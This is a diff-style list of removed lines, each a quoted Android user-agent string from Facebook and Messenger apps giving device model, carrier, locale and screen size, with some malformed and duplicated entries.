-    "Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/269.0.0.15.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/221129137;FBCR/Movistar;FBMF/ZTE;FBBD/ZTE;FBDV/ZTE Blade A5 2019;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;]",
-    "Dalvik/2.1.0(Linux;v; Android;D6.0;LG_X230build/MRA58K)[FBAN/EMA;UNITY_PACKAGE/1826;FBBV/262675052.fbav/230.0.0.3.121;fbdv/lg_x230;fblc/es_ES,FBOP/20,fbng/wifi,fbcq/con.moblica,common x mob.protocol.data connectionQualitydata@48e505d8;fbmnt/not_metereo]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; LM-X120 Build/PKQ1.180904.001) [FBAN/Orca-Android;FBAV/293.0.0.14.232;FBPN/com.facebook.orca;FBLC/en_CA;FBBV/261339538;FBCR/Lucky;FBMF/LGE;FBBD/lge;FBDV/LM-X120;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; YAL-L21 Build/ HUAWEIYAL-L61) [FBAN/Orca- Android;FBAV/301.0.0.12.112;F BPN/com.facebook.orca;FBLC/ en_GB;FBBV/274784541;FBCR/ TM;FBMF/HUAWEI;FBBD/ HUAWEI;FBDV/YAL-L21;FBSV/ 10;FBCA/arm64-v8a:null;FBDM/ {density=2.55,width=1080,height =2110};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;] FBBK/1",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
-    "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;",
-    "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/EMA;FBBV/335423312;FBAV/279.0.0.10.118;FBDV/SM-",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]",
-    "Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]",
-    "Dalvik/2.1.0 (Linux, U; Android 7.0, Hisense Hi 3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 2391017119 FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1]",
-    "Dalvik/2.1.0 (Linux, U; Android 7.0, HisenseHi3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 239.10.17.119,FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920;FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]",
-    "Dalvik/2.1.0 9Linux;U; Android 5.1.1; A37f Build/LMY47V( [FBAN/EMA;UNITY_PACKAGE/1315;FBBV/203779460;FBAV/190.0.0.6.117;FBDV/A37F;FBLC/en_US;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
